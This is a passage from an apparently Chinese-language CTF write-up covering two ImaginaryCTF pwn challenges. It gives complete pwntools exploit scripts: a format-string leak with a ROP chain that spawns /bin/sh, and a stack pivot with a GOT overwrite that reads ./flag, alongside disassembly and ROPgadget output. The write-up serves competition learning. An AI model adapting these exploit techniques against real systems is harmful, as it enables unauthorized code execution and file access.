canary <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span>
printf_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">0x7ffdec097dc0</span> <span class="token operator">-</span> <span class="token number">0x7ffdec097d38</span><span class="token punctuation">)</span>
sla<span class="token punctuation">(</span><span class="token string">"Still interested in selling your book? [y/n]"</span><span class="token punctuation">,</span><span class="token string">"y"</span><span class="token punctuation">)</span>


payload <span class="token operator">=</span> <span class="token string">b"-%10$s"</span>
payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>elf_base <span class="token operator">+</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
sla<span class="token punctuation">(</span><span class="token string">"title:"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>

ru<span class="token punctuation">(</span><span class="token string">"Book title --> "</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span>
libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
sla<span class="token punctuation">(</span><span class="token string">"Still interested in selling your book? [y/n]"</span><span class="token punctuation">,</span><span class="token string">"y"</span><span class="token punctuation">)</span>

payload <span class="token operator">=</span> <span class="token string">b"%"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0xf1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"c%10$hhn"</span>
payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>printf_addr<span class="token punctuation">)</span>
sla<span class="token punctuation">(</span><span class="token string">"title:"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>

time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>

rdi <span class="token operator">=</span> elf_base <span class="token operator">+</span> <span class="token number">0x0000000000002313</span>
ret <span class="token operator">=</span> elf_base <span class="token operator">+</span> <span class="token number">0x000000000000101a</span>
system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
binsh <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x68</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x8</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>
sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>




p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="ropity"><a href="#ropity" class="headerlink" title="ropity"></a>ropity</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401136</span>                               <span class="token punctuation">;</span> <span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401136</span>                               public main
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401136</span>                               main proc near                          <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> _start<span class="token operator">+</span><span class="token number">18</span>↑o
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401136</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401136</span>                               s<span class="token operator">=</span> byte ptr <span class="token operator">-</span><span class="token number">8</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401136</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401136</span>                               <span class="token punctuation">;</span> __unwind <span class="token punctuation">&#123;</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401136</span> F3 <span class="token number">0F</span> <span class="token number">1</span>E FA                   endbr64
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040113</span>A <span class="token number">55</span>                            push    rbp
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040113</span>B <span class="token number">48</span> <span class="token number">89</span> E5                      mov     rbp<span class="token punctuation">,</span> rsp
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040113</span>E <span class="token number">48</span> <span class="token number">83</span> EC <span class="token number">10</span>                   sub     rsp<span class="token punctuation">,</span> <span class="token number">10</span>h
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401142</span> <span class="token number">48</span> <span class="token number">8</span>B <span class="token number">15</span> E7 <span class="token number">2</span>E <span class="token number">00</span> <span class="token number">00</span>          mov     rdx<span class="token punctuation">,</span> cs<span class="token operator">:</span>__bss_start             <span class="token punctuation">;</span> stream
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401149</span> <span class="token number">48</span> <span class="token number">8</span>D <span class="token number">45</span> F8                   lea     rax<span class="token punctuation">,</span> <span class="token punctuation">[</span>rbp<span class="token operator">+</span>s<span class="token punctuation">]</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040114</span>D BE <span class="token number">00</span> <span class="token number">01</span> <span class="token number">00</span> <span class="token number">00</span>                mov     esi<span class="token punctuation">,</span> <span class="token number">100</span>h                       <span class="token punctuation">;</span> n
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401152</span> <span class="token number">48</span> <span class="token number">89</span> C7                      mov     rdi<span class="token punctuation">,</span> rax                        <span class="token punctuation">;</span> s
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401155</span> E8 E6 FE FF FF                call    _fgets
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401155</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040115</span>A <span class="token number">90</span>                            nop
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040115</span>B C9                            leave
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040115</span>C C3                            retn
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040115</span>C                               <span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token comment">// starts at 401136</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040115</span>C
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040115</span>C                               main endp
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040115</span>C
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040115</span>D
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040115</span>D                               <span class="token punctuation">;</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> S U B R O U T I N E <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040115</span>D
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040115</span>D                               <span class="token punctuation">;</span> Attributes<span class="token operator">:</span> bp<span class="token operator">-</span>based frame
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040115</span>D
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040115</span>D                               <span class="token punctuation">;</span> <span class="token keyword">signed</span> __int64 __fastcall <span class="token function">printfile</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">,</span> __int64<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040115</span>D                               public printfile
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040115</span>D                               printfile proc near
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040115</span>D
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040115</span>D                               var_8<span class="token operator">=</span> qword ptr <span class="token operator">-</span><span class="token number">8</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040115</span>D
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040115</span>D                               <span class="token punctuation">;</span> __unwind <span class="token punctuation">&#123;</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040115</span>D F3 <span class="token number">0F</span> <span class="token number">1</span>E FA                   endbr64
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401161</span> <span class="token number">55</span>                            push    rbp
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401162</span> <span class="token number">48</span> <span class="token number">89</span> E5                      mov     rbp<span class="token punctuation">,</span> rsp
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401165</span> <span class="token number">48</span> <span class="token number">89</span> <span class="token number">7</span>D F8                   mov     <span class="token punctuation">[</span>rbp<span class="token operator">+</span>var_8<span class="token punctuation">]</span><span class="token punctuation">,</span> rdi
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401169</span> <span class="token number">48</span> C7 C0 <span class="token number">02</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>          mov     rax<span class="token punctuation">,</span> <span class="token number">2</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401170</span> <span class="token number">48</span> C7 C6 <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>          mov     rsi<span class="token punctuation">,</span> <span class="token number">0</span>                          <span class="token punctuation">;</span> flags
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401177</span> <span class="token number">0F</span> <span class="token number">05</span>                         syscall                                 <span class="token punctuation">;</span> LINUX <span class="token operator">-</span> sys_open
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401179</span> <span class="token number">48</span> <span class="token number">89</span> C6                      mov     rsi<span class="token punctuation">,</span> rax                        <span class="token punctuation">;</span> in_fd
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040117</span>C <span class="token number">48</span> C7 C7 <span class="token number">01</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>          mov     rdi<span class="token punctuation">,</span> <span class="token number">1</span>                          <span class="token punctuation">;</span> out_fd
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401183</span> <span class="token number">48</span> C7 C2 <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>          mov     rdx<span class="token punctuation">,</span> <span class="token number">0</span>                          <span class="token punctuation">;</span> offset
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040118</span>A <span class="token number">49</span> C7 C0 <span class="token number">00</span> <span class="token number">01</span> <span class="token number">00</span> <span class="token number">00</span>          mov     r8<span class="token punctuation">,</span> <span class="token number">100</span>h
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401191</span> <span class="token number">48</span> C7 C0 <span class="token number">28</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>          mov     rax<span class="token punctuation">,</span> <span class="token number">28</span>h <span class="token punctuation">;</span> <span class="token char">'('</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401198</span> <span class="token number">0F</span> <span class="token number">05</span>                         syscall                                 <span class="token punctuation">;</span> LINUX <span class="token operator">-</span> sys_sendfile
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040119</span>A <span class="token number">90</span>                            nop
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040119</span>B <span class="token number">5</span>D                            pop     rbp
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040119</span>C C3                            retn
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040119</span>C                               <span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token comment">// starts at 40115D</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040119</span>C
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040119</span>C                               printfile endp
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040119</span>C<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>真的是很巧妙的构造，main函数中存在一个栈溢出，是fgets函数，然后有一个printfile函数，通过open 和 sendfile将一个文件的内容打印出来，printfile在使用前必须控制rdi寄存器才能printfile成功，由于高版本glibc csu函数变成了动态链接，所以以ret结尾能控制寄存器的gadget寥寥无几，能控制rdi寄存器为我想要的值的gadget基本上没有</p>
<pre class="line-numbers language-none"><code class="language-none">lhj@lhj-virtual-machine:~&#x2F;Desktop&#x2F;ImaginaryCTF&#x2F;pwn&#x2F;ropity$ ROPgadget --binary vuln
Gadgets information
&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
0x00000000004010ab : add bh, bh ; loopne 0x401115 ; nop ; ret
0x000000000040116f : add byte ptr [rax - 0x39], cl ; mov byte ptr [rax], 0 ; add byte ptr [rax], al ; syscall
0x0000000000401182 : add byte ptr [rax - 0x39], cl ; ret 0
0x0000000000401190 : add byte ptr [rax - 0x39], cl ; shr byte ptr [rax], 0 ; add byte ptr [rax], al ; syscall
0x0000000000401180 : add byte ptr [rax], al ; add byte ptr [rax - 0x39], cl ; ret 0
0x000000000040107c : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret
0x0000000000401173 : add byte ptr [rax], al ; add byte ptr [rax], al ; syscall
0x0000000000401036 : add byte ptr [rax], al ; add dl, dh ; jmp 0x401020
0x000000000040111a : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040107e : add byte ptr [rax], al ; endbr64 ; ret
0x000000000040118f : add byte ptr [rax], al ; mov rax, 0x28 ; syscall
0x000000000040116e : add byte ptr [rax], al ; mov rsi, 0 ; syscall
0x0000000000401175 : add byte ptr [rax], al ; syscall
0x000000000040100d : add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax
0x000000000040111b : add byte ptr [rcx], al ; pop rbp ; ret
0x00000000004010aa : add dil, dil ; loopne 0x401115 ; nop ; ret
0x0000000000401038 : add dl, dh ; jmp 0x401020
0x000000000040111c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401117 : add eax, 0x2f1b ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401017 : add esp, 8 ; ret
0x0000000000401016 : add rsp, 8 ; ret
0x0000000000401159 : call qword ptr [rax + 0xff3c3c9]
0x000000000040103e : call qword ptr [rax - 0x5e1f00d]
0x0000000000401014 : call rax
0x0000000000401133 : cli ; jmp 0x4010c0
0x0000000000401083 : cli ; ret
0x00000000004011a3 : cli ; sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401130 : endbr64 ; jmp 0x4010c0
0x0000000000401080 : endbr64 ; ret
0x0000000000401012 : je 0x401016 ; call rax
0x00000000004010a5 : je 0x4010b0 ; mov edi, 0x404030 ; jmp rax
0x00000000004010e7 : je 0x4010f0 ; mov edi, 0x404030 ; jmp rax
0x000000000040103a : jmp 0x401020
0x0000000000401134 : jmp 0x4010c0
0x000000000040100b : jmp 0x4840103f
0x00000000004010ac : jmp rax
0x000000000040115b : leave ; ret
0x00000000004010ad : loopne 0x401115 ; nop ; ret
0x0000000000401172 : mov byte ptr [rax], 0 ; add byte ptr [rax], al ; syscall
0x0000000000401116 : mov byte ptr [rip + 0x2f1b], 1 ; pop rbp ; ret
0x0000000000401192 : mov eax, 0x28 ; syscall
0x00000000004010a7 : mov edi, 0x404030 ; jmp rax
0x0000000000401171 : mov esi, 0 ; syscall
0x0000000000401191 : mov rax, 0x28 ; syscall
0x0000000000401170 : mov rsi, 0 ; syscall
0x000000000040115a : nop ; leave ; ret
0x000000000040119a : nop ; pop rbp ; ret
0x00000000004010af : nop ; ret
0x000000000040112c : nop dword ptr [rax] ; endbr64 ; jmp 0x4010c0
0x00000000004010a6 : or dword ptr [rdi + 0x404030], edi ; jmp rax
0x000000000040111d : pop rbp ; ret
0x000000000040101a : ret
0x0000000000401185 : ret 0
0x0000000000401011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x0000000000401118 : sbb ebp, dword ptr [rdi] ; add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401193 : shr byte ptr [rax], 0 ; add byte ptr [rax], al ; syscall
0x0000000000401194 : sub byte ptr [rax], al ; add byte ptr [rax], al ; syscall
0x00000000004011a5 : sub esp, 8 ; add rsp, 8 ; ret
0x00000000004011a4 : sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401177 : syscall
0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax
0x00000000004010a3 : test eax, eax ; je 0x4010b0 ; mov edi, 0x404030 ; jmp rax
0x00000000004010e5 : test eax, eax ; je 0x4010f0 ; mov edi, 0x404030 ; jmp rax
0x000000000040100f : test rax, rax ; je 0x401016 ; call rax
0x00000000004010a8 : xor byte ptr [rax + 0x40], al ; add bh, bh ; loopne 0x401115 ; nop ; ret

Unique gadgets found: 65
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>但是，细看会发现 fgets的rdi是可控的 因为取栈上的变量这个过程，实际上是通过 rbp - 一个正整数偏移去取的，如果能控制rbp，那 rdi的值就是可控的，如果将fgets的got修改成printfile，然后保证 rbp - 0x8的值是 .&#x2F;flag字符串的地址，gadget这个问题不就解决了吗。</p>
<pre class="line-numbers language-none"><code class="language-none">int __cdecl main(int argc, const char **argv, const char **envp)
&#123;
  char s[8]; &#x2F;&#x2F; [rsp+8h] [rbp-8h] BYREF

  return (unsigned int)fgets(s, 256, _bss_start);
&#125;

.text:0000000000401142 48 8B 15 E7 2E 00 00          mov     rdx, cs:__bss_start             ; stream
.text:0000000000401149 48 8D 45 F8                   lea     rax, [rbp+s]
.text:000000000040114D BE 00 01 00 00                mov     esi, 100h                       ; n
.text:0000000000401152 48 89 C7                      mov     rdi, rax                        ; s
.text:0000000000401155 E8 E6 FE FF FF                call    _fgets<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>首先需要栈迁移把栈迁移到已知 的地址上面的条件才能满足，第一次fgets 将rbp覆盖成 fgets_got + 0x8，然后调用 fgets，由于s的计算是通过rbp - 0x8，所以能直接将fgets_got覆盖，覆盖成printfile，然后再控制rbp，保证rbp - 0x8的值是flag最后调用fgets就好了</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment"># from LibcSearcher import *</span>
<span class="token keyword">import</span> itertools
<span class="token keyword">import</span> ctypes

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>

is_debug <span class="token operator">=</span> <span class="token number">1</span>
IP <span class="token operator">=</span> <span class="token string">"47.100.139.115"</span>
PORT <span class="token operator">=</span> <span class="token number">30708</span>

elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./vuln'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc
<span class="token comment"># libc = ELF('./libc.so.6')</span>

<span class="token keyword">def</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> remote<span class="token punctuation">(</span>IP<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token keyword">not</span> is_debug <span class="token keyword">else</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>

g <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
s <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
r <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> x <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">else</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
r_leak_libc_64 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
r_leak_libc_32 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

p <span class="token operator">=</span> connect<span class="token punctuation">(</span><span class="token punctuation">)</span>

print_file_func <span class="token operator">=</span> <span class="token number">0x00000000040115D</span>
fgets_func <span class="token operator">=</span> <span class="token number">0x000000000401142</span>
fgets_got <span class="token operator">=</span> <span class="token number">0x404018</span>

payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x8</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fgets_got <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token comment"># rbp</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fgets_func<span class="token punctuation">)</span> <span class="token comment"># rbp - 0x8</span>
sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>


<span class="token comment"># int __cdecl main(int argc, const char **argv, const char **envp)</span>
<span class="token comment"># &#123;</span>
<span class="token comment">#   char s[8]; // [rsp+8h] [rbp-8h] BYREF</span>

<span class="token comment">#   return (unsigned int)fgets(s, 256, _bss_start);</span>
<span class="token comment"># &#125;</span>

payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>print_file_func<span class="token punctuation">)</span> <span class="token comment"># 修改fgets的got为printf_file_func 来控制 rdi</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x404038</span><span class="token punctuation">)</span> <span class="token comment"># rbp</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fgets_func<span class="token punctuation">)</span> <span class="token comment"># 0x404028</span>
payload <span class="token operator">+=</span> <span class="token string">b"./flag\x00"</span>
<span class="token comment"># g(p)</span>
sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

